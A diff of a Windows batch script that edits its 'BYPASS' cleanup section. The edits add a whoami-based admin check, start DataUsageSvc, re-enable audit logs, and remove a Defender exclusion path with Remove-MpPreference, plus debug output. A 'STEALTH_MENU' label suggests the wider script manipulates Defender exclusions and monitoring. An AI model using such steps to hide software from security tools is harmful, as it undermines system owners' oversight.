@@ -247,18 +247,23 @@ goto STEALTH_MENU
 :BYPASS
 echo DEBUG: Starting Bypass - cleanup and restore...
 
-:: Requires admin permissions
-net session >nul 2>&2
+:: --- UPDATED ADMIN PRIVILEGE CHECK ---
+whoami /groups | find "S-1-5-32-544" > nul
 if %errorlevel% neq 0 (
-    echo ERROR: Admin privileges required to perform full cleanup.
+    echo ERROR: Admin privileges required to perform full cleanup. Please run this script as Administrator.
     pause
     goto STEALTH_MENU
 )
-echo DEBUG: Admin privileges confirmed.
+echo DEBUG: Admin privileges confirmed via whoami.
+pause
 
 echo DEBUG: Starting Data Usage Service...
 sc start "DataUsageSvc" >nul 2>&1
-if %errorlevel% neq 0 echo DEBUG: ERROR: Failed to start DataUsageSvc (might be already running or service missing).
+if %errorlevel% neq 0 (
+    echo DEBUG: ERROR: Failed to start DataUsageSvc. This might be because it's missing, disabled, or already running. Errorlevel: %errorlevel%
+) else (
+    echo DEBUG: DataUsageSvc started successfully.
+)
 pause
 
 echo DEBUG: Enabling audit logs...
@@ -271,13 +276,14 @@ echo DEBUG: SETUP_EXE path: %SETUP_EXE%
 pause "Press any key to execute PowerShell exclusion removal..."
 
 :: *** CRITICAL SECTION DEBUGGING - THIS IS THE PROBLEM AREA ***
+:: The >nul 2>&1 hides PowerShell's direct output, but the batch script checks its errorlevel.
 powershell -Command "Try { Remove-MpPreference -ExclusionPath '%SETUP_EXE%' -ErrorAction Stop } Catch { Write-Host 'PowerShell Removal Error: $_' -ForegroundColor Red; exit 1 }" >nul 2>&1
-:: IMPORTANT: The >nul 2>&1 above hides PowerShell's output. If PowerShell is printing an error,
-:: it won't show unless you remove >nul 2>&1 or add a debug echo within the Catch.
-:: For now, let's keep it to test if the BATCH script itself is terminated by something else.
-
-echo DEBUG: POST-POWERSHELL: Defender exclusion removal command completed or tried.
-echo DEBUG: Checking ERRORLEVEL from PowerShell: %errorlevel%
+if %errorlevel% equ 0 (
+    echo DEBUG: POST-POWERSHELL: Defender exclusion removal command completed with ERRORLEVEL 0 (success or handled).
+) else (
+    echo DEBUG: POST-POWERSHELL: Defender exclusion removal command returned non-zero ERRORLEVEL: %errorlevel% (failure).
+    echo DEBUG: If this line is reached, PowerShell reported an error.
+)
 pause "Press any key to continue after PowerShell check..."
 
 echo DEBUG: >>> STEP: PAST DEFENDER EXCLUSION REMOVAL <<<
@@ -347,7 +353,6 @@ if %errorlevel% equ 1 (
 )
 
 goto STEALTH_MENU
-
 
 
 
